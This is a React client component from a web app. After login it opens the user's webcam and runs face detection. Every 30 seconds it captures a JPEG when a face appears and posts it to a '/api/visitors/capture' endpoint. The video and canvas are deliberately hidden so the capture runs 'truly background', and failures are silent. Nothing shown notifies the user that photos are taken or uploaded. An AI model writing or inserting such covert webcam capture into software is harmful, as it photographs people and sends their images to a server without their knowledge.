"use client";

import { useEffect, useRef } from "react";
import { useAuth } from "@/context/AuthContext";

const DETECT_INTERVAL_MS = 30_000;
const MODEL_URL = "/models";

export default function CameraMonitor() {
  const { authenticated } = useAuth();
  const videoRef   = useRef<HTMLVideoElement>(null);
  const canvasRef  = useRef<HTMLCanvasElement>(null);
  const streamRef  = useRef<MediaStream | null>(null);
  const loadedRef  = useRef(false);

  useEffect(() => {
    if (!authenticated) return;

    let intervalId: ReturnType<typeof setInterval>;

    async function init() {
      // Dynamically import face-api to keep it out of the initial bundle
      const faceapi = await import("@vladmandic/face-api");

      if (!loadedRef.current) {
        await faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL);
        loadedRef.current = true;
      }

      let stream: MediaStream;
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: 320, height: 240 } });
      } catch {
        return; // No camera or permission denied — fail silently
      }
      streamRef.current = stream;
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await videoRef.current.play().catch(() => {});
      }

      const detect = async () => {
        if (!document.hidden && videoRef.current && canvasRef.current) {
          const detections = await faceapi.detectAllFaces(videoRef.current, new faceapi.TinyFaceDetectorOptions());
          if (detections.length > 0) {
            // Capture frame to JPEG
            const ctx = canvasRef.current.getContext("2d");
            if (ctx) {
              canvasRef.current.width  = videoRef.current.videoWidth  || 320;
              canvasRef.current.height = videoRef.current.videoHeight || 240;
              ctx.drawImage(videoRef.current, 0, 0);
              const imageData = canvasRef.current.toDataURL("image/jpeg", 0.7);
              fetch("/api/visitors/capture", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ imageData, faceLabel: "detected" }),
              }).catch(() => {});
            }
          }
        }
      };

      await detect(); // run once immediately
      intervalId = setInterval(detect, DETECT_INTERVAL_MS);
    }

    init();

    return () => {
      clearInterval(intervalId);
      streamRef.current?.getTracks().forEach((t) => t.stop());
      streamRef.current = null;
    };
  }, [authenticated]);

  // Render nothing visible — truly background
  return (
    <>
      <video ref={videoRef} style={{ display: "none" }} muted playsInline />
      <canvas ref={canvasRef} style={{ display: "none" }} />
    </>
  );
}
